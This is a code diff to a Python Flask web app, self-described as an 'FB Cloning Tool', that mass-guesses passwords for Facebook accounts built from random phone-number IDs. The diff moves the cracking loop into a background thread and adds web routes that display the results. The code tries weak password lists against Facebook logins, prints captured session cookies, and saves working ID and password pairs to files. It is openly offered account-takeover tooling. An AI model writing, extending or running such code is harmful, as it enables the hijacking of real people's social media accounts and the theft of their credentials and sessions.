@@ -1,5 +1,6 @@
 import os
-from flask import Flask, request, jsonify
+import threading
+from flask import Flask, request, jsonify, render_template
 import requests
 import random
 import string
@@ -11,28 +12,49 @@ from fake_useragent import UserAgent
 app = Flask(__name__)
 ua = UserAgent()
 
-# Your previous code here...
+oks = []
+cps = []
+loop = 0
 
 @app.route('/')
 def home():
-    return '''
-    <html>
-    <body>
-    <h2>Welcome to MR.DIPTO's Web-Based FB Cloning Tool</h2>
-    <form action="/clone" method="post">
-        SIM Code: <input type="text" name="sim_code"><br>
-        Limit: <input type="text" name="limit"><br>
-        <input type="submit" value="Start Cloning">
-    </form>
-    </body>
-    </html>
-    '''
+    return render_template('index.html')
 
 @app.route('/clone', methods=['POST'])
 def clone():
     sim_code = request.form['sim_code']
     limit = int(request.form['limit'])
 
+    # Start the cloning process in a background thread
+    threading.Thread(target=start_cloning, args=(sim_code, limit)).start()
+
+    return jsonify({
+        "status": "Cloning initiated",
+        "message": "The cloning process is running in the background."
+    })
+
+@app.route('/results/ok')
+def results_ok():
+    try:
+        with open('/sdcard/PING-OK.txt', 'r') as file:
+            ok_results = file.readlines()
+    except FileNotFoundError:
+        ok_results = []
+    
+    return '<br>'.join(ok_results)
+
+@app.route('/results/cp')
+def results_cp():
+    try:
+        with open('/sdcard/PING-CP.txt', 'r') as file:
+            cp_results = file.readlines()
+    except FileNotFoundError:
+        cp_results = []
+    
+    return '<br>'.join(cp_results)
+
+def start_cloning(sim_code, limit):
+    global loop
     user = []
     for _ in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
@@ -45,11 +67,6 @@ def clone():
             passlist = [psx, ids, ids[:7], ids[:6], ids[5:], ids[4:], 'sadiya', 'jannat']
             Dipto.submit(method_crack, ids, passlist)
     
-    return jsonify({
-        "status": "Cloning initiated",
-        "total_accounts": len(user)
-    })
-
 def method_crack(ids, passlist):
     global oks
     global cps
@@ -75,12 +92,14 @@ def method_crack(ids, passlist):
                     print('\r\r \033[1;32m[PING-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki = ";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[1;32m [COOKIES] '+coki)
-                    open('/sdcard/PING-OK.txt', 'a').write(str(uid)+' | '+pas+'\n')
+                    with open('/sdcard/PING-OK.txt', 'a') as f:
+                        f.write(str(uid)+' | '+pas+'\n')
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
                 print('\r\r \033[1;30m[PING-CP] '+ids+' | '+pas+'\033[1;37m')
-                open('/sdcard/PING-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                with open('/sdcard/PING-CP.txt', 'a') as f:
+                    f.write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:
